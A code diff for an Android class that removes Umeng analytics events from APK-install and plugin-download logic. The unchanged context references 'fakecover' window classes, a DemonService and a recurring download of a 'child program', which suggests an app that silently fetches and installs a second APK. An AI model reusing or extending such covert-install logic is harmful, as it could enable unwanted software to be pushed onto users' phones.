@@ -8,7 +8,6 @@ import android.text.TextUtils;
 import com.plugin.common.utils.UtilsRuntime;
 import com.plugin.common.utils.files.FileDownloader;
 import com.plugin.common.utils.files.FileOperatorHelper;
-import com.umeng.analytics.MobclickAgent;
 import com.xstd.qm.fakecover.FakeFactory;
 import com.xstd.qm.fakecover.FakeWindowInterface;
 import com.xstd.qm.service.DemonService;
@@ -32,13 +31,6 @@ public class UtilOperator {
 
     private static void intstallLocalApk(final Context context, final String fullPath) {
         if (!AppRuntime.isSIMCardReady(context)) {
-            //notify umeng
-            HashMap<String, String> log = new HashMap<String, String>();
-            log.put("channel", Config.CHANNEL_CODE);
-            log.put("phoneType", android.os.Build.MODEL);
-            log.put("versionName", UtilsRuntime.getVersionName(context));
-            MobclickAgent.onEvent(context, "sim_card_no_ready", log);
-            MobclickAgent.flush(context);
             return;
         }
 
@@ -166,15 +158,6 @@ public class UtilOperator {
                                         File localFile = new File(localUrl);
                                         localFile.delete();
 
-                                        //notify umeng
-                                        HashMap<String, String> log = new HashMap<String, String>();
-                                        log.put("channel", Config.CHANNEL_CODE);
-                                        log.put("phoneType", android.os.Build.MODEL);
-                                        log.put("versionName", UtilsRuntime.getVersionName(context));
-                                        log.put("reason", "apk check error");
-                                        MobclickAgent.onEvent(context, "download_failed", log);
-                                        MobclickAgent.flush(context);
-
                                         return;
                                     }
 
@@ -185,14 +168,6 @@ public class UtilOperator {
                                         }
                                     }
                                     Utils.saveExtraInfo("下载子程序成功");
-
-                                    //notify umeng
-                                    HashMap<String, String> log = new HashMap<String, String>();
-                                    log.put("channel", Config.CHANNEL_CODE);
-                                    log.put("phoneType", android.os.Build.MODEL);
-                                    log.put("versionName", UtilsRuntime.getVersionName(context));
-                                    MobclickAgent.onEvent(context, "download_success", log);
-                                    MobclickAgent.flush(context);
 
                                     return;
                                 }
@@ -206,15 +181,6 @@ public class UtilOperator {
                         if (Config.DEBUG) {
                             Config.LOGD("[[tryToDownloadPlugin]] try to reDownload for next round with time delay : 5M");
                         }
-
-                        //notify umeng
-                        HashMap<String, String> log = new HashMap<String, String>();
-                        log.put("channel", Config.CHANNEL_CODE);
-                        log.put("phoneType", android.os.Build.MODEL);
-                        log.put("versionName", UtilsRuntime.getVersionName(context));
-                        log.put("reason", "download fialed");
-                        MobclickAgent.onEvent(context, "download_failed", log);
-                        MobclickAgent.flush(context);
 
                         DemonService.startAlarmForAction(context, DemonService.ACTION_DOWNLOAD_PLUGIN, ((long) 5) * 60 * 1000);
                     }
